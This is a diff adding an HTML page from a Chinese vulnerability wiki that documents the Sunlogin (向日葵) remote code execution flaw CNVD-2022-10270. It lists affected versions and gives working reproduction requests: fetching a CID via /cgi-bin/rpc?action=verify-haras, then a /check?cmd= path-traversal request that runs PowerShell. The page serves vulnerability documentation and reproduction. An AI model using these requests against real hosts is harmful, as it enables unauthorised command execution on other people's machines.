@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%90%91%E6%97%A5%E8%91%B5/%E5%90%91%E6%97%A5%E8%91%B5%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CNVD-2022-10270%EF%BC%89/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>向日葵远程代码执行漏洞（CNVD-2022-10270） - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u5411\u65e5\u8475\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\uff08CNVD-2022-10270\uff09", url: "#_top", children: [
+              {title: "\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1" },
+              {title: "\u5f71\u54cd\u7248\u672c", url: "#_2" },
+              {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_3" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E5%90%AF%E6%98%8E%E6%98%9F%E8%BE%B0/%E5%90%AF%E6%98%8E%E6%98%9F%E8%BE%B0-%E5%A4%A9%E6%B8%85%E6%B1%89%E9%A9%ACVPN%E6%8E%A5%E5%8F%A3download%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E5%90%AF%E6%98%8E%E6%98%9F%E8%BE%B0/%E5%90%AF%E6%98%8E%E6%98%9F%E8%BE%B0-%E5%A4%A9%E6%B8%85%E6%B1%89%E9%A9%ACVPN%E6%8E%A5%E5%8F%A3download%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="btn btn-xs btn-link">
+        启明星辰-天清汉马VPN接口download任意文件读取
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E5%90%8C%E9%91%ABeHR/%E5%90%8C%E9%91%ABeHR%E4%BA%BA%E5%8A%9B%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FGetFlowDropDownListItems%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E5%90%8C%E9%91%ABeHR/%E5%90%8C%E9%91%ABeHR%E4%BA%BA%E5%8A%9B%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FGetFlowDropDownListItems%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        同鑫eHR人力资源管理系统GetFlowDropDownListItems存在SQL注入漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="cnvd-2022-10270">向日葵远程代码执行漏洞（CNVD-2022-10270）<a class="headerlink" href="#cnvd-2022-10270" title="Permanent link">&para;</a></h1>
+<h2 id="_1">漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>向日葵通过发送特定的请求获取CID后，可调用 check接口实现远程命令执行，导致服务器权限被获取。</p>
+<h2 id="_2">影响版本<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<ul>
+<li>向日葵个人版 for Windows &lt;=11.0.0.33162版本</li>
+<li>向日葵简约版 &lt;= V1.0.1.43315（2021.12）</li>
+</ul>
+<h2 id="_3">漏洞复现<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<p>向日葵开启后会默认在<code>4000-65535</code>之间开启某个端口</p>
+<p><img alt="1679820583875-6d7b4e9b-5387-4cf5-a2e6-88ddcde3bacd.png" src="./img/gUlc0BSsVT6Iv0WU/1679820583875-6d7b4e9b-5387-4cf5-a2e6-88ddcde3bacd-830006.png" /></p>
+<p>发送请求获取CID</p>
+<div class="highlight"><pre><span></span><code><span class="o">/</span><span class="n">cgi</span><span class="o">-</span><span class="n">bin</span><span class="o">/</span><span class="n">rpc</span><span class="o">?</span><span class="n">action</span><span class="o">=</span><span class="n">verify</span><span class="o">-</span><span class="n">haras</span>
+</code></pre></div>
+<p><img alt="1679820640646-5c60754e-fc3f-407f-9f0f-882daffc1ac8.png" src="./img/gUlc0BSsVT6Iv0WU/1679820640646-5c60754e-fc3f-407f-9f0f-882daffc1ac8-757223.png" /></p>
+<p>使用获取到的 verify_string 作为 cookie的 CID字段，进行命令执行</p>
+<div class="highlight"><pre><span></span><code><span class="o">/</span><span class="n">check</span><span class="o">?</span><span class="n">cmd</span><span class="o">=</span><span class="n">ping</span><span class="p">..</span><span class="o">%</span><span class="mf">2F</span><span class="p">..</span><span class="o">%</span><span class="mf">2F</span><span class="p">..</span><span class="o">%</span><span class="mf">2F</span><span class="p">..</span><span class="o">%</span><span class="mf">2F</span><span class="p">..</span><span class="o">%</span><span class="mf">2F</span><span class="p">..</span><span class="o">%</span><span class="mf">2F</span><span class="p">..</span><span class="o">%</span><span class="mf">2F</span><span class="p">..</span><span class="o">%</span><span class="mf">2F</span><span class="p">..</span><span class="o">%</span><span class="mf">2F</span><span class="n">windows</span><span class="o">%</span><span class="mf">2F</span><span class="n">system32</span><span class="o">%</span><span class="mf">2F</span><span class="n">WindowsPowerShell</span><span class="o">%</span><span class="mf">2F</span><span class="n">v1</span><span class="mf">.0</span><span class="o">%</span><span class="mf">2F</span><span class="n">powershell</span><span class="p">.</span><span class="na">exe</span><span class="o">+</span><span class="n">ipconfig</span>
+</code></pre></div>
+<p><img alt="1679820683541-36b5acf8-87ff-466c-aa76-1b3ea94f802c.png" src="./img/gUlc0BSsVT6Iv0WU/1679820683541-36b5acf8-87ff-466c-aa76-1b3ea94f802c-023495.png" /></p>
+<blockquote>
+<p>更新: 2024-02-29 23:58:31<br />
+原文: <a href="https://www.yuque.com/xiaokp7/ocvun2/re22tknn48ckod6v">https://www.yuque.com/xiaokp7/ocvun2/re22tknn48ckod6v</a></p>
+</blockquote>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E5%90%AF%E6%98%8E%E6%98%9F%E8%BE%B0/%E5%90%AF%E6%98%8E%E6%98%9F%E8%BE%B0-%E5%A4%A9%E6%B8%85%E6%B1%89%E9%A9%ACVPN%E6%8E%A5%E5%8F%A3download%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E5%90%AF%E6%98%8E%E6%98%9F%E8%BE%B0/%E5%90%AF%E6%98%8E%E6%98%9F%E8%BE%B0-%E5%A4%A9%E6%B8%85%E6%B1%89%E9%A9%ACVPN%E6%8E%A5%E5%8F%A3download%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="btn btn-xs btn-link">
+        启明星辰-天清汉马VPN接口download任意文件读取
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E5%90%8C%E9%91%ABeHR/%E5%90%8C%E9%91%ABeHR%E4%BA%BA%E5%8A%9B%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FGetFlowDropDownListItems%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E5%90%8C%E9%91%ABeHR/%E5%90%8C%E9%91%ABeHR%E4%BA%BA%E5%8A%9B%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FGetFlowDropDownListItems%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        同鑫eHR人力资源管理系统GetFlowDropDownListItems存在SQL注入漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
